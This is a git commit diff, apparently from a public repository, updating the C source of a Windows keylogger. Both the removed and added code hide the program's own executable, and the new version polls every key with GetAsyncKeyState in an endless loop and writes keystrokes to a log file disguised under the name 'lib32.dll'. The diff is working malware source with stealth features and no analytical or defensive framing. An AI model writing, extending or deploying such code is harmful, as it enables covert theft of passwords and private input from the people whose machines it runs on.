feaef200cdac5890dec1109b2d3339d23ac5dbdc
cybersecuritydef <155002701+cybersecuritydef@users.noreply.github.com>
2025-12-25 14:45:07 +0300

    Update keylogger.c

--- keylogger.c
+++ keylogger.c
@@ -1,31 +1,37 @@
 #include <stdio.h>
 #include <stdlib.h>
-#include <stdbool.h>
-#include <libgen.h>
+#include <locale.h>
+#include <shlwapi.h>
 
-#include "keyscan.h"
+#include "key.h"
 
-#define LEN_VALUE_NAME 1024
-#define KEY_FILE "key.log"
+#define KEY_LOG "lib32.dll"
+#define LEN_NAME 512
 
-bool hide(const char *path){
-    DWORD attr = 0;
-    attr = GetFileAttributesA(path);
-    if(attr & FILE_ATTRIBUTE_HIDDEN)
-        return TRUE;
-    attr |= FILE_ATTRIBUTE_HIDDEN;
-    return SetFileAttributes(path, attr);
+bool hide(char *path){
+    STARTUPINFO sinfo = {};
+    PROCESS_INFORMATION pinfo = {};
+    sinfo.cb = sizeof(sinfo);
+    sinfo.dwFlags = STARTF_USESHOWWINDOW;
+    sinfo.wShowWindow = SW_HIDE;
+    return CreateProcess(NULL, path, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &sinfo, &pinfo);
 }
 
 int main(int argc, char **argv){
-    CHAR cur_path[LEN_VALUE_NAME] = {'\0'};
-    FreeConsole();
-    GetModuleFileName(NULL, cur_path, sizeof(cur_path));
-    hide(cur_path);
-    sprintf_s(cur_path, LEN_VALUE_NAME, "%s\\%s", dirname(cur_path), KEY_FILE);
-    hide(cur_path);
-    while(TRUE){
-        scan_code(cur_path);
+    int i = 0;
+    setlocale(LC_ALL, "Russian");
+    char path[LEN_NAME] = {'\0'};
+    char fullpath[LEN_NAME] = {'\0'};
+    GetModuleFileName(NULL, path, sizeof(path));
+    snprintf(fullpath, LEN_NAME, "attrib +H %s", path);
+    hide(fullpath);
+    PathRemoveFileSpec(path);
+    snprintf(path, LEN_NAME, "%s\\%s", path, KEY_LOG);
+    while(true){
+        for(i = 0; i < 255; i++){
+            if(GetAsyncKeyState(i) == -32767)
+                save_file(path, key_value(i));
+        }
         Sleep(1);
     }
     return 0;
